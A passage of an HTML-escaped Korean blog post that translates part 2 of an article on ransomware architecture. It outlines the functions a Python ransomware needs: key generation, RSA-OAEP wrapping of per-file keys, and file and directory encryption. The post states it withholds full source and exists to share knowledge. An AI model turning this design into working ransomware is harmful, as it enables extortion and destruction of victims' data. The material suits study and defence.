&lt;p&gt;&lt;img src=&#34;/2021/04/25/idioth/arch_of_ransomware_part2/Untitled.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xBBF8; &amp;#xC9C0;&amp;#xB098;&amp;#xAC04; &amp;#xC77C; &amp;#xD6C4;&amp;#xD68C;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026; &amp;#xAE30;&amp;#xB9D0; &amp;#xB54C; &amp;#xB354; &amp;#xC798;&amp;#xD558;&amp;#xBA74; &amp;#xB418;&amp;#xB2C8;&amp;#xAE4C;&amp;#xC694;^^. &amp;#xC7A1;&amp;#xB2F4;&amp;#xC774; &amp;#xAE38;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC624;&amp;#xB298;&amp;#xC740; &amp;#xC800;&amp;#xBC88; &amp;#xAC8C;&amp;#xC2DC;&amp;#xAE00;&amp;#xC5D0; &amp;#xC774;&amp;#xC5B4;&amp;#xC11C; &amp;#xD30C;&amp;#xD2B8; 2&amp;#xB97C; &amp;#xC9C4;&amp;#xD589;&amp;#xD558;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xC804; &amp;#xAC8C;&amp;#xC2DC;&amp;#xAE00; &amp;#xBCF4;&amp;#xB7EC;&amp;#xAC00;&amp;#xAE30;: &lt;a href=&#34;https://hackyboiz.github.io/2021/04/11/idioth/arch_of_ransomware_part1/&#34;&gt;[Translation] Architecture of Ransomware Part 1&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;#xC6D0;&amp;#xBB38; &amp;#xAE00; : &lt;a href=&#34;https://infosecwriteups.com/architecture-of-a-ransomware-2-2-e22d8eb11cee&#34;&gt;Architecture of a ransomware (2/2)&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2021/04/11/idioth/arch_of_ransomware_part1/&#34;&gt;Part 1&lt;/a&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;&amp;#xAC00; &amp;#xD6A8;&amp;#xACFC;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xB3D9;&amp;#xC791;&amp;#xD558;&amp;#xB294;&amp;#xB370; &amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xC8FC;&amp;#xC694;&amp;#xD55C; &amp;#xAC1C;&amp;#xB150;&amp;#xC5D0; &amp;#xB300;&amp;#xD574;&amp;#xC11C; &amp;#xC124;&amp;#xBA85;&amp;#xD588;&amp;#xB2E4;. &amp;#xC774;&amp;#xBC88; &amp;#xD30C;&amp;#xD2B8;&amp;#xC5D0;&amp;#xC11C; &amp;#xD30C;&amp;#xC774;&amp;#xC36C; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xAC1C;&amp;#xB150;&amp;#xB4E4;&amp;#xC744; &amp;#xBCF4;&amp;#xC5EC;&amp;#xC904; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;. &amp;#xB610;&amp;#xD55C; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB97C; &amp;#xC704;&amp;#xD55C; pycryptodome &amp;#xD30C;&amp;#xC774;&amp;#xC36C; &amp;#xB77C;&amp;#xC774;&amp;#xBE0C;&amp;#xB7EC;&amp;#xB9AC;&amp;#xC758; &amp;#xAE30;&amp;#xBCF8;&amp;#xC801;&amp;#xC778; &amp;#xC0AC;&amp;#xC6A9;&amp;#xBC95;&amp;#xB3C4; &amp;#xB2E4;&amp;#xB8F0; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;. &amp;#xC2A4;&amp;#xD06C;&amp;#xB9BD;&amp;#xD2B8; &amp;#xD0A4;&amp;#xB514;&amp;#xB4E4;&amp;#xC774; &amp;#xC545;&amp;#xC6A9;&amp;#xD560; &amp;#xC218; &amp;#xC5C6;&amp;#xB3C4;&amp;#xB85D; &amp;#xC804;&amp;#xCCB4; &amp;#xC18C;&amp;#xC2A4; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC62C;&amp;#xB9AC;&amp;#xC9C4; &amp;#xC54A;&amp;#xC744; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;. &amp;#xC774; &amp;#xAC8C;&amp;#xC2DC;&amp;#xAE00;&amp;#xC758; &amp;#xBAA9;&amp;#xC801;&amp;#xC740; &amp;#xC545;&amp;#xC131; &amp;#xD589;&amp;#xC704;&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xB77C;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xC544;&amp;#xB2C8;&amp;#xB77C; &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4; &amp;#xC545;&amp;#xC131;&amp;#xCF54;&amp;#xB4DC;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xC9C0;&amp;#xC2DD;&amp;#xC744; &amp;#xACF5;&amp;#xC720;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;.&lt;/p&gt;
&lt;h1 id=&#34;&amp;#xC77C;&amp;#xBC18;&amp;#xC801;&amp;#xC778;-&amp;#xACE0;&amp;#xB824;-&amp;#xC0AC;&amp;#xD56D;&#34;&gt;&lt;a href=&#34;#&amp;#xC77C;&amp;#xBC18;&amp;#xC801;&amp;#xC778;-&amp;#xACE0;&amp;#xB824;-&amp;#xC0AC;&amp;#xD56D;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xC77C;&amp;#xBC18;&amp;#xC801;&amp;#xC778; &amp;#xACE0;&amp;#xB824; &amp;#xC0AC;&amp;#xD56D;&#34;&gt;&lt;/a&gt;&amp;#xC77C;&amp;#xBC18;&amp;#xC801;&amp;#xC778; &amp;#xACE0;&amp;#xB824; &amp;#xC0AC;&amp;#xD56D;&lt;/h1&gt;&lt;p&gt;&amp;#xC5EC;&amp;#xB7EC; &amp;#xAC1C;&amp;#xC758; &amp;#xC624;&amp;#xD508; &amp;#xC18C;&amp;#xC2A4; &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;&amp;#xAC00; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xBA70; &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4; &amp;#xAC1C;&amp;#xBC1C;&amp;#xC5D0; &amp;#xAD00;&amp;#xD574;&amp;#xC11C; &amp;#xCC3E;&amp;#xC544;&amp;#xBCF4;&amp;#xB2E4;&amp;#xAC00; &lt;a href=&#34;https://medium.com/u/ea2f2c25847b?source=post_page-----e22d8eb11cee--------------------------------&#34;&gt;Tarc&amp;#xED;sio Marinho&lt;/a&gt;&amp;#xAC00; &amp;#xAC1C;&amp;#xBC1C;&amp;#xD55C; &lt;a href=&#34;https://github.com/tarcisio-marinho/GonnaCry&#34;&gt;GonnaCry&lt;/a&gt;&amp;#xB77C;&amp;#xB294; &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;&amp;#xB97C; &amp;#xBC1C;&amp;#xACAC;&amp;#xD588;&amp;#xB2E4;. &amp;#xCF54;&amp;#xB4DC;&amp;#xAC00; &amp;#xB9E4;&amp;#xC6B0; &amp;#xBD84;&amp;#xBA85;&amp;#xD558;&amp;#xBA70; &amp;#xC77D;&amp;#xC5B4; &amp;#xBCF4;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xCD94;&amp;#xCC9C;&amp;#xD55C;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xC758; &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;&amp;#xB294; &amp;#x201C;management side&amp;#x201D;&amp;#xB97C; &amp;#xC704;&amp;#xD55C; &amp;#xBAA8;&amp;#xB4E0; &amp;#xCF54;&amp;#xB4DC;&amp;#xAC00; &amp;#xD3EC;&amp;#xD568;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB294; &amp;#xBCF5;&amp;#xD638;&amp;#xD654; &amp;#xD0A4;&amp;#xB97C; &amp;#xAD00;&amp;#xB9AC;&amp;#xD558;&amp;#xACE0; &amp;#xAC10;&amp;#xC5FC;&amp;#xB41C; &amp;#xD074;&amp;#xB77C;&amp;#xC774;&amp;#xC5B8;&amp;#xD2B8;&amp;#xC640; &amp;#xD1B5;&amp;#xC2E0;&amp;#xD558;&amp;#xB294; &amp;#xD574;&amp;#xCEE4; &amp;#xCE21; &amp;#xC11C;&amp;#xBC84;&amp;#xB97C; &amp;#xCF54;&amp;#xB529;&amp;#xD588;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xD544;&amp;#xC790;&amp;#xB294; &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;&amp;#xAC00; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xB3D9;&amp;#xC791;&amp;#xD558;&amp;#xB294;&amp;#xC9C0; &amp;#xBC30;&amp;#xC6B0;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &amp;#xBAA8;&amp;#xB4E0; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC791;&amp;#xC131;&amp;#xD558;&amp;#xC600;&amp;#xACE0;, &amp;#xC2E4;&amp;#xC81C; &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;&amp;#xB294; &amp;#xC774; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xBAA8;&amp;#xB450; &amp;#xB2E4;&amp;#xB974;&amp;#xAC8C; &amp;#xCC98;&amp;#xB9AC;&amp;#xD558;&amp;#xBBC0;&amp;#xB85C; &amp;#xD574;&amp;#xB2F9; &amp;#xBD80;&amp;#xBD84;&amp;#xC740; &amp;#xB2E4;&amp;#xB8E8;&amp;#xACE0; &amp;#xC2F6;&amp;#xC9C0; &amp;#xC54A;&amp;#xC558;&amp;#xB2E4;. payment&amp;#xB97C; &amp;#xB4F1;&amp;#xB85D;&amp;#xD558;&amp;#xACE0; &amp;#xBCF5;&amp;#xD638;&amp;#xD654; &amp;#xD0A4;&amp;#xB97C; &amp;#xC804;&amp;#xC1A1;&amp;#xD558;&amp;#xB294; &amp;#xC790;&amp;#xB3D9;&amp;#xD654; &amp;#xC11C;&amp;#xBE44;&amp;#xC2A4;, victim&amp;#xACFC; &amp;#xC9C1;&amp;#xC811; &amp;#xC0C1;&amp;#xD638;&amp;#xC791;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; &amp;#xD1A0;&amp;#xB974; &amp;#xC774;&amp;#xBA54;&amp;#xC77C; &amp;#xC8FC;&amp;#xC18C;, &amp;#xBA87; &amp;#xAC1C;&amp;#xC758; &amp;#xC0D8;&amp;#xD50C; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xBCF5;&amp;#xD638;&amp;#xD654;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294;&amp;#xC9C0; &amp;#xD655;&amp;#xC778;&amp;#xD558;&amp;#xB294; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C; &amp;#xB4F1;&amp;#xC774; &amp;#xC788;&amp;#xC744; &amp;#xC218;&amp;#xB3C4; &amp;#xC788;&amp;#xB2E4;. &amp;#xC774; &amp;#xBD80;&amp;#xBD84;&amp;#xC740; &amp;#xCEA0;&amp;#xD398;&amp;#xC778;&amp;#xB9C8;&amp;#xB2E4; &amp;#xB2EC;&amp;#xB77C;&amp;#xC11C; &amp;#xB2E4;&amp;#xB8E8;&amp;#xC9C0; &amp;#xC54A;&amp;#xC744; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;. &amp;#xB098;&amp;#xB294; &amp;#xD074;&amp;#xB77C;&amp;#xC774;&amp;#xC5B8;&amp;#xD2B8; &amp;#xAC10;&amp;#xC5FC; &amp;#xCE21;&amp;#xBA74;&amp;#xC5D0; &amp;#xC8FC;&amp;#xB85C; &amp;#xD3EC;&amp;#xCEE4;&amp;#xC2A4;&amp;#xB97C; &amp;#xB9DE;&amp;#xCD9C; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;.&lt;/p&gt;
&lt;h1 id=&#34;&amp;#xC5B8;&amp;#xC5B4;-&amp;#xC120;&amp;#xD0DD;&#34;&gt;&lt;a href=&#34;#&amp;#xC5B8;&amp;#xC5B4;-&amp;#xC120;&amp;#xD0DD;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xC5B8;&amp;#xC5B4; &amp;#xC120;&amp;#xD0DD;&#34;&gt;&lt;/a&gt;&amp;#xC5B8;&amp;#xC5B4; &amp;#xC120;&amp;#xD0DD;&lt;/h1&gt;&lt;p&gt;&amp;#xD544;&amp;#xC790;&amp;#xB294; &amp;#xBA87; &amp;#xAC00;&amp;#xC9C0; &amp;#xC774;&amp;#xC720;&amp;#xB85C; &amp;#xD30C;&amp;#xC774;&amp;#xC36C;&amp;#xC744; &amp;#xC120;&amp;#xD0DD;&amp;#xD588;&amp;#xB2E4;. &amp;#xC8FC;&amp;#xC694;&amp;#xD55C; &amp;#xC774;&amp;#xC720;&amp;#xB294; &amp;#x3139;&amp;#x3147; &amp;#xC77D;&amp;#xAE30; &amp;#xC27D;&amp;#xACE0; &amp;#xC774;&amp;#xD574;&amp;#xD558;&amp;#xAE30; &amp;#xC26C;&amp;#xC6B0;&amp;#xB2C8;&amp;#xAE4C;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%201.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;os.system&lt;/code&gt;&amp;#xC73C;&amp;#xB85C; &amp;#xD638;&amp;#xCD9C;&amp;#xB41C; OS&amp;#xBCC4; &amp;#xBA85;&amp;#xB839;&amp;#xC5B4;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xC73C;&amp;#xBA74; &amp;#xD06C;&amp;#xB85C;&amp;#xC2A4; &amp;#xD50C;&amp;#xB7AB;&amp;#xD3FC; &amp;#xB610;&amp;#xD55C; &amp;#xAC00;&amp;#xB2A5;&amp;#xD558;&amp;#xB2E4;. &amp;#xB610;&amp;#xD55C; &amp;#xC18D;&amp;#xB3C4;&amp;#xAC00; &amp;#xBE60;&amp;#xB974;&amp;#xACE0; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB97C; &amp;#xC704;&amp;#xD55C; &amp;#xB77C;&amp;#xC774;&amp;#xBE0C;&amp;#xB7EC;&amp;#xB9AC;&amp;#xAC00; &amp;#xC788;&amp;#xB2E4;. &amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9;&amp;#xC73C;&amp;#xB85C; &amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xB41C; &amp;#xCF54;&amp;#xB4DC; &amp;#xB09C;&amp;#xB3C5;&amp;#xD654;&amp;#xAC00; &amp;#xAC00;&amp;#xB2A5;&amp;#xD558;&amp;#xC5EC; &amp;#xB9AC;&amp;#xBC84;&amp;#xC2F1;&amp;#xD558;&amp;#xAE30; &amp;#xC5B4;&amp;#xB835;&amp;#xAC8C; &amp;#xB9CC;&amp;#xB4E4; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xD30C;&amp;#xC774;&amp;#xC36C; &amp;#xB77C;&amp;#xC774;&amp;#xBE0C;&amp;#xB7EC;&amp;#xB9AC;&amp;#xB97C; &amp;#xC120;&amp;#xD0DD;&amp;#xD560; &amp;#xB54C; &amp;#xB3D9;&amp;#xC77C;&amp;#xD55C; &amp;#xAE30;&amp;#xB2A5;&amp;#xC744; &amp;#xD558;&amp;#xB294; &amp;#xAC78; &amp;#xC5EC;&amp;#xB7EC; &amp;#xAC1C; &amp;#xCC3E;&amp;#xC544;&amp;#xB77C;. &amp;#xAC01;&amp;#xAC01;&amp;#xC758; &amp;#xAC83;&amp;#xC744; &amp;#xC5F0;&amp;#xAD6C;&amp;#xD558;&amp;#xACE0; &amp;#xAC00;&amp;#xC7A5; &amp;#xB9CE;&amp;#xC774; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xC120;&amp;#xD0DD;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC740; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xCC98;&amp;#xB7FC; &amp;#xBE60;&amp;#xB974;&amp;#xAC8C; &amp;#xBCC0;&amp;#xD654;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC5D0; &amp;#xB300;&amp;#xD574;&amp;#xC11C; &amp;#xC88B;&amp;#xC740; &amp;#xC811;&amp;#xADFC; &amp;#xBC29;&amp;#xC2DD;&amp;#xC774;&amp;#xB2E4;. &amp;#xC624;&amp;#xB798;&amp;#xB41C; &amp;#xB77C;&amp;#xC774;&amp;#xBE0C;&amp;#xB7EC;&amp;#xB9AC;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xAC70;&amp;#xB098; &lt;a href=&#34;https://blog.malwarebytes.com/threat-analysis/2018/04/lockcrypt-ransomware/&#34;&gt;Lockcrypt&lt;/a&gt;&amp;#xCC98;&amp;#xB7FC; &amp;#xC790;&amp;#xCCB4; &amp;#xAC1C;&amp;#xBC1C;&amp;#xD55C; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;(&amp;#xD558;&amp;#xC9C0; &amp;#xB9C8;)&amp;#xD558;&amp;#xBA74; &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;&amp;#xAC00; &amp;#xBCF5;&amp;#xD638;&amp;#xD654;&amp;#xB420; &amp;#xC218;&amp;#xB3C4; &amp;#xC788;&amp;#xB2E4;.  &amp;#xC6B0;&amp;#xB9AC;&amp;#xB294; &amp;#xC798; &amp;#xC54C;&amp;#xB824;&amp;#xC9C4; &amp;#xB77C;&amp;#xC774;&amp;#xBE0C;&amp;#xB7EC;&amp;#xB9AC; &lt;a href=&#34;https://pypi.org/project/pycryptodome/&#34;&gt;pycryptodome&lt;/a&gt;&amp;#xACFC; &lt;a href=&#34;https://docs.python.org/3/library/secrets.html&#34;&gt;secrets&lt;/a&gt;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Note: &amp;#xC2E4;&amp;#xC81C;&amp;#xB85C; &amp;#xBE44;&amp;#xB300;&amp;#xCE6D;+&amp;#xB300;&amp;#xCE6D; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB97C; &amp;#xACB0;&amp;#xD569;&amp;#xD55C; wrapper&amp;#xAC00; &amp;#xC788;&amp;#xC9C0;&amp;#xB9CC; &amp;#xAC1C;&amp;#xB150;&amp;#xC744; &amp;#xC124;&amp;#xBA85;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; pycryptodome&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD574; &amp;#xAC01; &amp;#xAE30;&amp;#xB2A5;&amp;#xC744; &amp;#xAD6C;&amp;#xD604;&amp;#xD560; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%202.png&#34; alt&gt;&lt;/p&gt;
&lt;h1 id=&#34;&amp;#xD544;&amp;#xC694;&amp;#xD55C;-&amp;#xAE30;&amp;#xB2A5;-&amp;#xC694;&amp;#xC57D;&#34;&gt;&lt;a href=&#34;#&amp;#xD544;&amp;#xC694;&amp;#xD55C;-&amp;#xAE30;&amp;#xB2A5;-&amp;#xC694;&amp;#xC57D;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xAE30;&amp;#xB2A5; &amp;#xC694;&amp;#xC57D;&#34;&gt;&lt;/a&gt;&amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xAE30;&amp;#xB2A5; &amp;#xC694;&amp;#xC57D;&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;generate32ByteKey()&lt;/code&gt;: &amp;#xB79C;&amp;#xB364;&amp;#xD55C; 32&amp;#xBC14;&amp;#xC774;&amp;#xD2B8; &amp;#xD0A4;&amp;#xB97C; &amp;#xC0DD;&amp;#xC131;&amp;#xD55C;&amp;#xB2E4;. &amp;#xC774;&amp;#xB97C; &amp;#xC218;&amp;#xD589;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD55C; &amp;#xC5EC;&amp;#xB7EC; &amp;#xAC00;&amp;#xC9C0; &amp;#xBC29;&amp;#xBC95;&amp;#xC774; &amp;#xC788;&amp;#xB2E4;. &lt;code&gt;/dev/urandom&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xBB38;&amp;#xC790;&amp;#xC5F4;&amp;#xC744; &amp;#xAE01;&amp;#xC5B4;&amp;#xC640;&amp;#xC11C; &lt;code&gt;sha256sum&lt;/code&gt;&amp;#xC744; &amp;#xD558;&amp;#xBA74; &amp;#xB418;&amp;#xC9C0;&amp;#xB9CC; &amp;#xB9AC;&amp;#xB205;&amp;#xC2A4;&amp;#xC5D0; &amp;#xD55C;&amp;#xC815;&amp;#xC801;&amp;#xC774;&amp;#xBA70; &amp;#xD06C;&amp;#xB85C;&amp;#xC2A4; &amp;#xD50C;&amp;#xB7AB;&amp;#xD3FC;&amp;#xC73C;&amp;#xB85C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xACE0; &amp;#xC2F6;&amp;#xC73C;&amp;#xBBC0;&amp;#xB85C; secrets &amp;#xB77C;&amp;#xC774;&amp;#xBE0C;&amp;#xB7EC;&amp;#xB9AC;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;. &lt;code&gt;secrets.token_hex(32)&lt;/code&gt;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xC218;&amp;#xD589;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rsaEncryptSecret(string, publicKey)&lt;/code&gt;: public key&amp;#xB97C; &amp;#xAC00;&amp;#xC9C0;&amp;#xACE0; secret&amp;#xC744; &amp;#xBE44;&amp;#xB300;&amp;#xCE6D; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xD55C;&amp;#xB2E4;(private key&amp;#xB97C; &amp;#xD1B5;&amp;#xD574;&amp;#xC11C;&amp;#xB9CC; &amp;#xBCF5;&amp;#xD638;&amp;#xD654;&amp;#xB428;). &amp;#xC774;&amp;#xB807;&amp;#xAC8C; &amp;#xD558;&amp;#xBA74; &amp;#xAC01; &amp;#xD30C;&amp;#xC77C;&amp;#xC5D0; &amp;#xB300;&amp;#xD574; &amp;#xC0DD;&amp;#xC131;&amp;#xB41C; &amp;#xB300;&amp;#xCE6D; &amp;#xD0A4;&amp;#xB97C; publicKey&amp;#xB85C; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;. &amp;#xD074;&amp;#xB77C;&amp;#xC774;&amp;#xC5B8;&amp;#xD2B8;&amp;#xB294; &amp;#xAC01; &amp;#xD30C;&amp;#xC77C;&amp;#xC758; &amp;#xB300;&amp;#xCE6D; &amp;#xD0A4;&amp;#xB97C; &amp;#xBCF5;&amp;#xD638;&amp;#xD654;&amp;#xD558;&amp;#xB824;&amp;#xBA74; &amp;#xC6B0;&amp;#xB9AC;&amp;#xC758; private key&amp;#xAC00; &amp;#xD544;&amp;#xC694;&amp;#xD558;&amp;#xB2E4;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rsaDecryptSecret(secret, privateKey)&lt;/code&gt;: private &amp;#xBE44;&amp;#xB300;&amp;#xCE6D; &amp;#xD0A4;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xB41C; &amp;#xB300;&amp;#xCE6D;&amp;#xD0A4;&amp;#xB97C; &amp;#xBCF5;&amp;#xD638;&amp;#xD654;&amp;#xD55C;&amp;#xB2E4;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;symEncryptFile(publicKey, file)&lt;/code&gt;: &amp;#xC554;&amp;#xD638;&amp;#xD654; &amp;#xB85C;&amp;#xC9C1;&amp;#xC744; &amp;#xD3EC;&amp;#xD568;&amp;#xD558;&amp;#xBBC0;&amp;#xB85C; &amp;#xAC00;&amp;#xC7A5; &amp;#xBCF5;&amp;#xC7A1;&amp;#xD55C; &amp;#xBD80;&amp;#xBD84;&amp;#xC774;&amp;#xB2E4;. &amp;#xC544;&amp;#xB798;&amp;#xC5D0; &amp;#xC790;&amp;#xC138;&amp;#xD788; &amp;#xC124;&amp;#xBA85;&amp;#xD560; &amp;#xAC70;&amp;#xC9C0;&amp;#xB9CC;, &amp;#xC774;&amp;#xB984;&amp;#xC73C;&amp;#xB85C; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xB4EF;&amp;#xC774; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xD558;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xB2E4;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;symDecryptFile(privateKey, file)&lt;/code&gt;: &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xBCF5;&amp;#xD638;&amp;#xD654;&amp;#xD55C;&amp;#xB2E4;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;symEncryptDirectory(publicKey, dir)&lt;/code&gt;: &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130;&amp;#xB85C; &amp;#xB514;&amp;#xB809;&amp;#xD130;&amp;#xB9AC;&amp;#xB97C; &amp;#xBC1B;&amp;#xC544;&amp;#xC11C; &amp;#xB0B4;&amp;#xBD80;&amp;#xC5D0; &amp;#xC788;&amp;#xB294; &amp;#xBAA8;&amp;#xB4E0; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xAC00;&amp;#xC838;&amp;#xC628;&amp;#xB2E4;. &amp;#xADF8; &amp;#xD6C4; &lt;code&gt;symEncryptFile&lt;/code&gt;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD55C;&amp;#xB2E4;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;symDecryptDirectory(privateKey, dir)&lt;/code&gt;: &lt;code&gt;symEncryptDirectory&lt;/code&gt;&amp;#xC640; &amp;#xBE44;&amp;#xC2B7;&amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; &amp;#xBC18;&amp;#xB300;&amp;#xC758; &amp;#xAE30;&amp;#xB2A5;&amp;#xC744; &amp;#xD55C;&amp;#xB2E4;.&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;rsaEncryptSecret&#34;&gt;&lt;a href=&#34;#rsaEncryptSecret&#34; class=&#34;headerlink&#34; title=&#34;rsaEncryptSecret&#34;&gt;&lt;/a&gt;rsaEncryptSecret&lt;/h1&gt;&lt;p&gt;RSA&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; secret key&amp;#xB97C; &amp;#xC554;&amp;#xD638;&amp;#xD654;&amp;#xD560; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;. RSA&amp;#xB294; &amp;#xAE30;&amp;#xBCF8;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xB79C;&amp;#xB364;&amp;#xC131; &amp;#xC5C6;&amp;#xC774; &amp;#xC554;&amp;#xD638;&amp;#xD654; &amp;#xB418;&amp;#xBBC0;&amp;#xB85C; &amp;#xAE30;&amp;#xBCF8;&amp;#xC801;&amp;#xC778; RSA&amp;#xC5D0; &amp;#xB79C;&amp;#xB364;&amp;#xC131;&amp;#xACFC; &lt;a href=&#34;https://en.wikipedia.org/wiki/Trapdoor_function&#34;&gt;one-way permutation trapdoor&lt;/a&gt;&amp;#xB97C; &amp;#xCD94;&amp;#xAC00;&amp;#xD55C; padding scheme&amp;#xC778; &lt;a href=&#34;https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding&#34;&gt;Optimal asymmetric encryption padding(OAEP)&lt;/a&gt;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xAC83;&amp;#xC774;&amp;#xB2E4;. OAEP&amp;#xC640; &amp;#xAC19;&amp;#xC774; RSA&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xB54C; &amp;#xACB0;&amp;#xACFC; cypher &amp;#xD06C;&amp;#xAE30;&amp;#xB294; modulus(&lt;code&gt;key 